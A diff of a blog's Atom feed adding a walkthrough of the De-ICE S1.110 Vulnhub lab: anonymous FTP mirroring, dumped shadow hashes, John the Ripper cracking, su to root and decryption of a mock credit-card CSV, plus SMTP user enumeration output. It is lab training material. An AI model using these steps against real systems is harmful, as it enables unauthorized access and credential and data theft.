@@ -4,7 +4,7 @@
   <title><![CDATA[Category: Vulnhub | 0x41414141]]></title>
   <link href="http://73696e65.github.io/blog/categories/vulnhub/atom.xml" rel="self"/>
   <link href="http://73696e65.github.io/"/>
-  <updated>2015-05-09T23:34:16+02:00</updated>
+  <updated>2015-05-10T00:01:37+02:00</updated>
   <id>http://73696e65.github.io/</id>
   <author>
     <name><![CDATA[Norbert Szetei]]></name>
@@ -12,6 +12,217 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[DE-ICE-S1.110]]></title>
+    <link href="http://73696e65.github.io/blog/2015/05/10/de-ice-s1-dot-110/"/>
+    <updated>2015-05-10T00:01:04+02:00</updated>
+    <id>http://73696e65.github.io/blog/2015/05/10/de-ice-s1-dot-110</id>
+    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/de-ice-s1110,9/">De-ICE: S1.110</a></p>
+
+<p>Nmap output:
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>21/tcp  open     ftp     vsftpd 2.0.4
+</span><span class='line'>22/tcp  filtered ssh
+</span><span class='line'>80/tcp  open     http    Apache httpd 2.2.4 ((Unix) mod_ssl/2.2.4 OpenSSL/0.9.8b DAV/2)
+</span><span class='line'>631/tcp open     ipp     CUPS 1.1</span></code></pre></td></tr></table></div></figure></p>
+
+<p>FTP anonymous login is allowed:
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>wget -r &lt;a href="ftp://ftp@192.168.1.110:">ftp://ftp@192.168.1.110:&lt;/a></span></code></pre></td></tr></table></div></figure></p>
+
+<p>We have found a few files, but nothing particularly interesting:
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/DE-ICE-S1.110/192.168.1.110/download# cat ./opt/cygwin/etc/passwd
+</span><span class='line'>SYSTEM:&lt;em>:18:544:,S-1-5-18::
+</span><span class='line'>Administrators:&lt;/em>:544:544:,S-1-5-32-544::
+</span><span class='line'>Administrator:unused_by_nt/2000/xp:500:513:U-Tom-PC\Administrator,S-1-5-21-1894367954-3740816113-1455894701-500:/home/Administrator:/bin/bash
+</span><span class='line'>Guest:unused_by_nt/2000/xp:501:513:U-Tom-PC\Guest,S-1-5-21-1894367954-3740816113-1455894701-501:/home/Guest:/bin/bash
+</span><span class='line'>Tom:unused_by_nt/2000/xp:1000:513:U-Tom-PC\Tom,S-1-5-21-1894367954-3740816113-1455894701-1000:/home/Tom:/bin/bash
+</span><span class='line'>&lt;strong>vmware_user&lt;/strong>:unused_by_nt/2000/xp:1002:513:&lt;strong>vmware_user&lt;/strong>,U-Tom-PC__vmware_user&lt;strong>,S-1-5-21-1894367954-3740816113-1455894701-1002:/home/&lt;/strong>vmware_user__:/bin/bash&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>root@kali:~/DE-ICE-S1.110# cat 192.168.1.110/download/etc/shadow
+</span><span class='line'>root:$1$3OF/pWTC$lvhdyl86pAEQcrvepWqpu.:12859:0:::::
+</span><span class='line'>bin:&lt;em>:9797:0:::::
+</span><span class='line'>daemon:&lt;/em>:9797:0:::::
+</span><span class='line'>adm:&lt;em>:9797:0:::::
+</span><span class='line'>lp:&lt;/em>:9797:0:::::
+</span><span class='line'>sync:&lt;em>:9797:0:::::
+</span><span class='line'>shutdown:&lt;/em>:9797:0:::::
+</span><span class='line'>halt:&lt;em>:9797:0:::::
+</span><span class='line'>mail:&lt;/em>:9797:0:::::
+</span><span class='line'>&lt;a href="news:*:9797:0:::::">news:*:9797:0:::::&lt;/a>
+</span><span class='line'>uucp:&lt;em>:9797:0:::::
+</span><span class='line'>operator:&lt;/em>:9797:0:::::
+</span><span class='line'>games:&lt;em>:9797:0:::::
+</span><span class='line'>&lt;a href="ftp:*:9797:0:::::">ftp:*:9797:0:::::&lt;/a>
+</span><span class='line'>smmsp:&lt;/em>:9797:0:::::
+</span><span class='line'>mysql:&lt;em>:9797:0:::::
+</span><span class='line'>rpc:&lt;/em>:9797:0:::::
+</span><span class='line'>sshd:&lt;em>:9797:0:::::
+</span><span class='line'>gdm:&lt;/em>:9797:0:::::
+</span><span class='line'>pop:&lt;em>:9797:0:::::
+</span><span class='line'>nobody:&lt;/em>:9797:0:::::&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>toor             (root)</span></code></pre></td></tr></table></div></figure></p>
+
+<p>More about cygwin format <a href="https://cygwin.com/cygwin-ug-net/ntsec.html">here</a>.</p>
+
+<p>In /etc directory, there is a core file which contains password hashes:
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/DE-ICE-S1.110/192.168.1.110/download/etc# strings core | tail -1
+</span><span class='line'>root:$1$aQo/FOTu$rriwTq.pGmN3OhFe75yd30:13574:0:::::bin:&lt;em>:9797:0:::::daemon:&lt;/em>:9797:0:::::adm:&lt;em>:9797:0:::::lp:&lt;/em>:9797:0:::::sync:&lt;em>:9797:0:::::shutdown:&lt;/em>:9797:0:::::halt:&lt;em>:9797:0:::::mail:&lt;/em>:9797:0:::::&lt;a href="news:*:9797:0:::::uucp:*:9797:0:::::operator:*:9797:0:::::games:*:9797:0:::::ftp:*:9797:0:::::smmsp:*:9797:0:::::mysql:*:9797:0:::::rpc:*:9797:0:::::sshd:*:9797:0:::::gdm:*:9797:0:::::pop:*:9797:0:::::nobody:*:9797:0:::::aadams:$1$klZ09iws$fQDiqXfQXBErilgdRyogn.:13570:0:99999:7:::bbanter:$1$1wY0b2Bt$Q6cLev2TG9eH9iIaTuFKy1:13571:0:99999:7:::ccoffee:$1$6yf/SuEu$EZ1TWxFMHE0pDXCCMQu70/:13574:0:99999:7:::">news:*:9797:0:::::uucp:*:9797:0:::::operator:*:9797:0:::::games:*:9797:0:::::ftp:*:9797:0:::::smmsp:*:9797:0:::::mysql:*:9797:0:::::rpc:*:9797:0:::::sshd:*:9797:0:::::gdm:*:9797:0:::::pop:*:9797:0:::::nobody:*:9797:0:::::aadams:$1$klZ09iws$fQDiqXfQXBErilgdRyogn.:13570:0:99999:7:::bbanter:$1$1wY0b2Bt$Q6cLev2TG9eH9iIaTuFKy1:13571:0:99999:7:::ccoffee:$1$6yf/SuEu$EZ1TWxFMHE0pDXCCMQu70/:13574:0:99999:7:::&lt;/a></span></code></pre></td></tr></table></div></figure></p>
+
+<p>After adjusting:
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root:$1$aQo/FOTu$rriwTq.pGmN3OhFe75yd30:13574:0:::::
+</span><span class='line'>bin:&lt;em>:9797:0:::::
+</span><span class='line'>daemon:&lt;/em>:9797:0:::::
+</span><span class='line'>adm:&lt;em>:9797:0:::::
+</span><span class='line'>lp:&lt;/em>:9797:0:::::
+</span><span class='line'>sync:&lt;em>:9797:0:::::
+</span><span class='line'>shutdown:&lt;/em>:9797:0:::::
+</span><span class='line'>halt:&lt;em>:9797:0:::::
+</span><span class='line'>mail:&lt;/em>:9797:0:::::
+</span><span class='line'>&lt;a href="news:*:9797:0:::::">news:*:9797:0:::::&lt;/a>
+</span><span class='line'>uucp:&lt;em>:9797:0:::::
+</span><span class='line'>operator:&lt;/em>:9797:0:::::
+</span><span class='line'>games:&lt;em>:9797:0:::::
+</span><span class='line'>&lt;a href="ftp:*:9797:0:::::">ftp:*:9797:0:::::&lt;/a>
+</span><span class='line'>smmsp:&lt;/em>:9797:0:::::
+</span><span class='line'>mysql:&lt;em>:9797:0:::::
+</span><span class='line'>rpc:&lt;/em>:9797:0:::::
+</span><span class='line'>sshd:&lt;em>:9797:0:::::
+</span><span class='line'>gdm:&lt;/em>:9797:0:::::
+</span><span class='line'>pop:&lt;em>:9797:0:::::
+</span><span class='line'>nobody:&lt;/em>:9797:0:::::
+</span><span class='line'>aadams:$1$klZ09iws$fQDiqXfQXBErilgdRyogn.:13570:0:99999:7:::
+</span><span class='line'>bbanter:$1$1wY0b2Bt$Q6cLev2TG9eH9iIaTuFKy1:13571:0:99999:7:::
+</span><span class='line'>ccoffee:$1$6yf/SuEu$EZ1TWxFMHE0pDXCCMQu70/:13574:0:99999:7:::</span></code></pre></td></tr></table></div></figure></p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ john ~/DE-ICE-S1.110/crackme.john &ndash;wordlist=&ldquo;/root/darkc0de.lst&rdquo;
+</span><span class='line'>Complexity       (root)
+</span><span class='line'>Zymurgy          (bbanter)</span></code></pre></td></tr></table></div></figure></p>
+
+<p>We log in as user bbanter and obtain root permissions:
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>bbanter@slax:/$ su root
+</span><span class='line'>Password: **********
+</span><span class='line'>root@slax:/# id
+</span><span class='line'>uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy)</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Lastly, we check the backup file and decrypt CSV:
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@slax:/home/root/.save# cat copy.sh&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;h1&gt;!/bin/sh&lt;/h1&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;h1&gt;encrypt files in ftp/incoming&lt;/h1&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;openssl enc -aes-256-cbc -salt -in /home/ftp/incoming/<span class="nv">$1</span> -out /home/root/.save/<span class="nv">$1</span>.enc -pass file:/etc/ssl/certs/pw&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;h1&gt;remove old file&lt;/h1&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;rm /home/ftp/incoming/<span class="nv">$1</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@slax:/home/root/.save# cat /etc/ssl/certs/pw
+</span><span class='line'>d2Ews4TgaQm72C0nr5t5U9noRfdllV62speWeC410il1lfd3Cxe2RqSx5o0Of</span></code></pre></td></tr></table></div></figure></p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@slax:/home/root/.save# openssl enc -aes-256-cbc -d -in customer_account.csv.enc -pass file:/etc/ssl/certs/pw
+</span><span class='line'>&ldquo;CustomerID&rdquo;,&ldquo;CustomerName&rdquo;,&ldquo;CCType&rdquo;,&ldquo;AccountNo&rdquo;,&ldquo;ExpDate&rdquo;,&ldquo;DelMethod&rdquo;
+</span><span class='line'>1002,&ldquo;Mozart Exercise Balls Corp.&rdquo;,&ldquo;VISA&rdquo;,&ldquo;2412225132153211&rdquo;,&ldquo;11/09&rdquo;,&ldquo;SHIP&rdquo;
+</span><span class='line'>1003,&ldquo;Brahms 4-Hands Pianos&rdquo;,&ldquo;MC&rdquo;,&ldquo;3513151542522415&rdquo;,&ldquo;07/08&rdquo;,&ldquo;SHIP&rdquo;
+</span><span class='line'>1004,&ldquo;Strauss Blue River Drinks&rdquo;,&ldquo;MC&rdquo;,&ldquo;2514351522413214&rdquo;,&ldquo;02/08&rdquo;,&ldquo;PICKUP&rdquo;
+</span><span class='line'>1005,&ldquo;Beethoven Hearing-Aid Corp.&rdquo;,&ldquo;VISA&rdquo;,&ldquo;5126391235199246&rdquo;,&ldquo;09/09&rdquo;,&ldquo;SHIP&rdquo;
+</span><span class='line'>1006,&ldquo;Mendelssohn Wedding Dresses&rdquo;,&ldquo;MC&rdquo;,&ldquo;6147032541326464&rdquo;,&ldquo;01/10&rdquo;,&ldquo;PICKUP&rdquo;
+</span><span class='line'>1007,&ldquo;Tchaikovsky Nut Importer and Supplies&rdquo;,&ldquo;VISA&rdquo;,&ldquo;4123214145321524&rdquo;,&ldquo;05/08&rdquo;,&ldquo;SHIP&rdquo;</span></code></pre></td></tr></table></div></figure></p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[DE-ICE-S1.100]]></title>
@@ -303,12 +514,12 @@ we generate the potential login names:</p>
 <span class='line-number'>8</span>
 <span class='line-number'>9</span>
 <span class='line-number'>10</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>mail from: &lt;a href="&#109;&#x61;&#x69;&#x6c;&#x74;&#111;&#58;&#x61;&#x40;&#x73;&#x6c;&#x61;&#120;&#x2e;&#101;&#120;&#x61;&#109;&#x70;&#108;&#101;&#46;&#110;&#x65;&#x74;">&#97;&#64;&#115;&#x6c;&#x61;&#x78;&#x2e;&#101;&#120;&#97;&#x6d;&#112;&#108;&#101;&#x2e;&#110;&#x65;&#x74;&lt;/a>
-</span><span class='line'>250 2.1.0 &lt;a href="&#109;&#97;&#x69;&#x6c;&#x74;&#x6f;&#58;&#x61;&#64;&#x73;&#x6c;&#x61;&#120;&#46;&#x65;&#120;&#x61;&#109;&#x70;&#108;&#x65;&#x2e;&#110;&#101;&#x74;&#x2e;&#x2e;&#x2e;">&#x61;&#64;&#115;&#x6c;&#x61;&#x78;&#46;&#101;&#120;&#x61;&#109;&#112;&#108;&#x65;&#x2e;&#110;&#x65;&#x74;&#x2e;&#46;&#x2e;&lt;/a> Sender ok
-</span><span class='line'>rcpt to: &lt;a href="&#109;&#97;&#105;&#108;&#x74;&#x6f;&#x3a;&#98;&#98;&#97;&#x6e;&#116;&#101;&#114;&#x40;&#x73;&#x6c;&#97;&#120;&#46;&#101;&#120;&#97;&#x6d;&#112;&#108;&#x65;&#x2e;&#x6e;&#x65;&#116;">&#98;&#98;&#x61;&#110;&#x74;&#101;&#x72;&#x40;&#115;&#108;&#97;&#120;&#46;&#101;&#120;&#97;&#x6d;&#112;&#108;&#x65;&#46;&#110;&#x65;&#x74;&lt;/a>
-</span><span class='line'>250 2.1.5 &lt;a href="&#109;&#97;&#105;&#x6c;&#x74;&#111;&#58;&#x62;&#98;&#x61;&#x6e;&#x74;&#x65;&#x72;&#64;&#x73;&#x6c;&#97;&#x78;&#x2e;&#101;&#x78;&#x61;&#109;&#x70;&#x6c;&#x65;&#x2e;&#110;&#x65;&#x74;&#46;&#x2e;&#x2e;">&#98;&#98;&#x61;&#110;&#116;&#x65;&#x72;&#x40;&#115;&#108;&#97;&#120;&#x2e;&#x65;&#120;&#97;&#x6d;&#x70;&#108;&#101;&#x2e;&#x6e;&#101;&#116;&#x2e;&#46;&#x2e;&lt;/a> Recipient ok
+</pre></td><td class='code'><pre><code class=''><span class='line'>mail from: &lt;a href="&#109;&#x61;&#x69;&#x6c;&#x74;&#x6f;&#58;&#x61;&#x40;&#x73;&#x6c;&#x61;&#x78;&#x2e;&#101;&#120;&#x61;&#109;&#112;&#x6c;&#x65;&#x2e;&#110;&#x65;&#x74;">&#97;&#x40;&#115;&#x6c;&#x61;&#x78;&#x2e;&#101;&#x78;&#x61;&#x6d;&#112;&#x6c;&#101;&#x2e;&#x6e;&#x65;&#116;&lt;/a>
+</span><span class='line'>250 2.1.0 &lt;a href="&#109;&#97;&#x69;&#108;&#x74;&#x6f;&#58;&#x61;&#64;&#x73;&#x6c;&#97;&#120;&#x2e;&#x65;&#120;&#x61;&#109;&#112;&#108;&#101;&#x2e;&#x6e;&#x65;&#x74;&#x2e;&#x2e;&#46;">&#97;&#64;&#115;&#108;&#x61;&#x78;&#46;&#101;&#x78;&#97;&#x6d;&#x70;&#108;&#x65;&#x2e;&#110;&#101;&#116;&#x2e;&#x2e;&#46;&lt;/a> Sender ok
+</span><span class='line'>rcpt to: &lt;a href="&#x6d;&#97;&#105;&#108;&#x74;&#x6f;&#x3a;&#98;&#98;&#x61;&#110;&#x74;&#x65;&#114;&#64;&#x73;&#108;&#97;&#120;&#x2e;&#101;&#x78;&#x61;&#x6d;&#x70;&#x6c;&#x65;&#x2e;&#110;&#x65;&#116;">&#x62;&#x62;&#97;&#x6e;&#116;&#101;&#114;&#x40;&#115;&#x6c;&#x61;&#x78;&#x2e;&#101;&#x78;&#97;&#109;&#112;&#108;&#x65;&#46;&#x6e;&#101;&#x74;&lt;/a>
+</span><span class='line'>250 2.1.5 &lt;a href="&#109;&#97;&#105;&#108;&#116;&#x6f;&#58;&#98;&#98;&#97;&#x6e;&#x74;&#101;&#114;&#64;&#x73;&#x6c;&#x61;&#120;&#46;&#x65;&#120;&#97;&#109;&#112;&#108;&#x65;&#46;&#110;&#101;&#x74;&#46;&#46;&#x2e;">&#98;&#98;&#x61;&#110;&#116;&#x65;&#x72;&#64;&#115;&#x6c;&#97;&#120;&#46;&#x65;&#120;&#x61;&#109;&#x70;&#x6c;&#101;&#x2e;&#x6e;&#x65;&#x74;&#x2e;&#x2e;&#x2e;&lt;/a> Recipient ok
 </span><span class='line'>rcpt to: bbanter
-</span><span class='line'>250 2.1.5 &lt;a href="&#109;&#97;&#105;&#x6c;&#116;&#x6f;&#x3a;&#98;&#x62;&#97;&#x6e;&#116;&#x65;&#x72;&#x40;&#x73;&#108;&#97;&#120;&#x2e;&#x65;&#x78;&#x61;&#109;&#112;&#108;&#101;&#46;&#x6e;&#101;&#116;&#x2e;&#46;&#46;">&#x62;&#x62;&#x61;&#110;&#x74;&#101;&#114;&#x40;&#x73;&#x6c;&#97;&#120;&#x2e;&#x65;&#120;&#x61;&#109;&#112;&#108;&#x65;&#46;&#110;&#x65;&#116;&#46;&#x2e;&#46;&lt;/a> Recipient ok
+</span><span class='line'>250 2.1.5 &lt;a href="&#109;&#x61;&#x69;&#x6c;&#116;&#x6f;&#58;&#98;&#98;&#97;&#x6e;&#116;&#101;&#x72;&#64;&#x73;&#x6c;&#x61;&#x78;&#46;&#x65;&#120;&#x61;&#109;&#112;&#108;&#x65;&#x2e;&#x6e;&#101;&#116;&#x2e;&#x2e;&#x2e;">&#x62;&#x62;&#97;&#x6e;&#116;&#101;&#x72;&#x40;&#115;&#108;&#97;&#120;&#x2e;&#101;&#120;&#97;&#109;&#x70;&#108;&#101;&#x2e;&#110;&#101;&#116;&#x2e;&#46;&#46;&lt;/a> Recipient ok
 </span><span class='line'>rcpt to: aadam
 </span><span class='line'>550 5.1.1 aadam&hellip; User unknown
 </span><span class='line'>rcpt to: aadams
